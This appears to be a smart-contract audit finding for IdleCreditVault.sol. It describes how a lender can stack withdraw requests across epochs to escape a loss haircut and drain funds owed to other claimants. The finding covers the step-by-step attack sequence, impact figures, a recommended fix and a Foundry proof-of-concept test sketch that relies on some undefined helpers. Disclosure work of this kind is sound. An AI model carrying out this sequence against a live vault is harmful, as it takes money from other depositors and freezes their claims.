### Title
Cross-epoch withdraw receipts evade the `stopEpochWithDuration` loss haircut, overpaying the attacker and insolventing funded claims — (`contracts/strategies/idle/IdleCreditVault.sol`)

### Summary
`collectWithdrawFunds` applies a single loss-recovery price to the **entire** `pendingWithdraws` aggregate when a stopped epoch ends with a loss, but `_claimLossAdjustedWithdrawRequest` only haircuts the portion of the receipt recorded under `lastWithdrawRequest[_user]` (the most recent request epoch). Any receipt basis recorded under an earlier epoch in `withdrawsRequestsByEpoch` is later paid at par by `_claimFundedWithdrawRequest`, even though it was only funded at the haircut ratio. The attacker extracts the difference from underlyings funded for other claimants.

### Finding Description
`requestWithdraw` records each request both in the aggregate `withdrawsRequests[_user]` and per-epoch `withdrawsRequestsByEpoch[_user][currentEpoch]` [1](#0-0) . A user is explicitly allowed to stack requests across epochs without claiming ("if a user does not claim a withdraw request and instead requests another withdraw, he will have to wait for another epoch to claim both requests") [2](#0-1) .

At `stopEpochWithDuration`, the borrower funds `_amount < pendingWithdraws`; the shortfall is recorded as `lossRecoveryPriceByEpoch[epochNumber] = _amount * 1e18 / pendingBasis` against the **whole** pending aggregate — which includes receipts requested in earlier epochs [3](#0-2) .

On claim, `_claimLossAdjustedWithdrawRequest` looks up `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]` and haircuts only the basis stored under that single epoch key [4](#0-3) . `_clearWithdrawClaimForEpoch` zeroes only `withdrawsRequestsByEpoch[_user][_claimEpoch]` [5](#0-4) . The leftover earlier-epoch basis remains in `withdrawsRequests[_user]` and is paid 1:1 by `_claimFundedWithdrawRequest` via `_transferFundedClaim` [6](#0-5) .

The guard in `requestWithdraw` only blocks a new request when a loss price **already** exists for the user's last epoch; it cannot prevent stacking beforehand because the loss is only recorded at the next `stopEpoch` [7](#0-6) .

### Impact Explanation
Broken invariant: loss socialization / one-receipt-one-payout. Vault was funded `price * (A + B)` where `A` is the attacker's epoch `N-1` basis and `B` their epoch `N` basis. The attacker receives `price*B + A`, i.e. an excess of `A * (1 - price)` paid at par. This excess comes directly out of underlyings collected to fund other users' haircut receipts, so later claimants' `claimWithdrawRequest` reverts on insufficient balance — direct theft plus permanent freezing of other users' funded claims. With a 50% loss price and equal split, an attacker stacking half their receipt into the prior epoch steals `0.25 × totalBasis` from the pool.

### Likelihood Explanation
Attacker is an ordinary KYC-passed lender/tranche holder. Sequence: request withdraw `A` in epoch `N-1`, do not claim after `stopEpoch`, request `B` during epoch `N` buffer (allowed, since no loss price exists yet), then the epoch ends via `stopEpochWithDuration` with a realized loss (borrower underpayment — an ordinary credit event, not attacker-controlled privilege). The attacker then calls `cdoEpoch.claimWithdrawRequest()` and receives the overpayment; honest users' claims revert. No privileged role, timing race, or oracle manipulation required — only a normal partial-loss stop, which the codebase explicitly supports via `previewLossAdjustedWithdrawFunds`/`collectWithdrawFunds`.

### Recommendation
Track the haircut basis consistently: either record the loss price against the aggregate and haircut the user's **entire** `withdrawsRequests` basis for epochs `<= lossEpoch` (iterate/accumulate all per-epoch bases when clearing), or split `pendingWithdraws` funding per request epoch so each epoch's receipts carry their own recovery price. Simplest fix: in `_claimLossAdjustedWithdrawRequest`, compute `claimBasis` as the sum of all `withdrawsRequestsByEpoch[_user][e]` entries contributing to the pending bucket (and correspondingly clear them), rather than only `lastWithdrawRequest`.

### Proof of Concept
Foundry fork test sketch (extend `test/foundry/IdleCreditVault.t.sol` helpers):

```solidity
function testCrossEpochLossHaircutBypass() external {
    address attacker = makeAddr('attacker');
    address victim   = makeAddr('victim');

    _depositWithUser(attacker, 100_000 * ONE_SCALE, true);
    _depositWithUser(victim,   100_000 * ONE_SCALE, true);

    // Epoch N-1 buffer: attacker requests withdraw of A, victim of V
    uint256 aA = IERC20(AAtranche).balanceOf(attacker) / 2;
    uint256 vA = IERC20(AAtranche).balanceOf(victim) / 2;
    vm.prank(attacker); cdoEpoch.requestWithdraw(aA, address(AAtranche));
    vm.prank(victim);   cdoEpoch.requestWithdraw(vA, address(AAtranche));

    // Epoch N-1 runs and stops cleanly; receipts funded but attacker does NOT claim
    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr, _expectedFundsEndEpoch());

    // Epoch N buffer: attacker stacks a second request B (guard passes: no loss price yet)
    uint256 aB = IERC20(AAtranche).balanceOf(attacker);
    vm.prank(attacker); cdoEpoch.requestWithdraw(aB, address(AAtranche));

    // Epoch N ends with a loss: borrower funds only price * pendingBasis
    _startEpochAndCheckPrices(1);
    uint256 pending = strategy.pendingWithdraws();
    uint256 funded  = pending / 2; // 50% recovery price
    // drive stopEpochWithDuration / collectWithdrawFunds path with loss so
    // lossRecoveryPriceByEpoch[1] == 0.5e18
    _stopEpochWithLoss(funded);

    // Attacker claims: epoch-N basis haircut, epoch-(N-1) basis paid at par
    uint256 balPre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();
    uint256 got = underlying.balanceOf(attacker) - balPre;

    uint256 fair = (aA + aB) * strategy.lossRecoveryPriceByEpoch(1) / 1e18;
    assertGt(got, fair);                       // attacker overpaid
    assertEq(got - fair, aA / 2);              // stolen = A * (1 - price)

    // Victim's haircut claim now underflows the vault balance -> frozen/denied
    vm.prank(victim);
    vm.expectRevert(); // insufficient funded underlyings
    cdoEpoch.claimWithdrawRequest();
}
```

```text
  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
```
